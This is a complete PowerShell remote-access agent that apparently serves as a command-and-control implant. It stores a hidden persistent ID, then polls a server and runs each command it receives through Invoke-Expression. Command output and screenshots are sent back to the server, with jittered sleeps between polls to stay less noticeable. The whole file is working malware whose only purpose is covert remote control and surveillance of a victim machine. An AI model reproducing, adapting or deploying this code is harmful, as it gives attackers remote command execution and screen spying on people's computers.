$server = "http://192.168.100.239:8080"  # Change to your Render or Railway URL

# --- Agent ID Persistence ---
# Create a unique, persistent ID for this agent so the C2 can track it.
$screenCaptureEnabled = $false
$agentIdFile = "$env:APPDATA\agent_id.txt"
if (Test-Path $agentIdFile) {
    $agentId = Get-Content $agentIdFile
} else {
    $agentId = [guid]::NewGuid().ToString()
    # Hide the file to be slightly more stealthy
    Set-Content -Path $agentIdFile -Value $agentId
    (Get-Item $agentIdFile).Attributes = "Hidden"
}

function Capture-Screen {
    # Add error handling to capture the screen
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms

        $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
        $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

        $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

        $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)

        $base64Image = [Convert]::ToBase64String($memoryStream.ToArray())
        return $base64Image
    } catch {
        Write-Output "Error capturing screen: $($_.Exception.Message)"
        return $null
    }
}
while ($true) {
    try {
        # Get task from server. The server's JSON response will be parsed into a PowerShell object.
        $task = Invoke-RestMethod -Uri "$server/get_task/$agentId" -Method GET
        $command = $task.command

        # Handle special commands to control agent state
        if ($command -eq "start-screen") {
            $screenCaptureEnabled = $true
        }
        elseif ($command -eq "stop-screen") {
            $screenCaptureEnabled = $false
        }
        # Handle regular commands, ignoring "sleep"
        elseif ($command -ne "sleep") {
            # Execute the command
            $output = Invoke-Expression $command 2>&1 | Out-String

            # Send output back
            $body = @{
                output = $output
            } | ConvertTo-Json -Compress
            
            Invoke-RestMethod -Uri "$server/post_output/$agentId" -Method POST -Body $body -ContentType "application/json"
        }

        # If screen capture is enabled, send a frame. This runs independently of command execution.
        if ($screenCaptureEnabled -eq $true) {
            $imageData = Capture-Screen
            if ($imageData) {
                try {
                    $body = @{
                        image_data = $imageData
                    } | ConvertTo-Json -Compress
                   
                    Invoke-RestMethod -Uri "$server/post_screen/$agentId" -Method POST -Body $body -ContentType "application/json"

                }
                catch {
                    Write-Output "Error sending screen capture: $($_.Exception.Message)"
                }
            }
            else {
                Write-Output "Failed to capture screen."
            }
        }
    } catch {
        # For your experimentation, it's useful to see errors.
        # In a real-world scenario, this would be silent or logged differently.
        Write-Output "An error occurred: $($_.Exception.Message)"
    }

    # Sleep with jitter. Use a shorter interval when screen monitoring is active for better responsiveness.
    if ($screenCaptureEnabled -eq $true) {
        # Poll more frequently during screen monitoring
        $sleepSeconds = Get-Random -Minimum 2 -Maximum 4
    }
    else {
        # Normal, slower polling interval
        $sleepSeconds = Get-Random -Minimum 8 -Maximum 16
    }
    Start-Sleep -Seconds $sleepSeconds
}
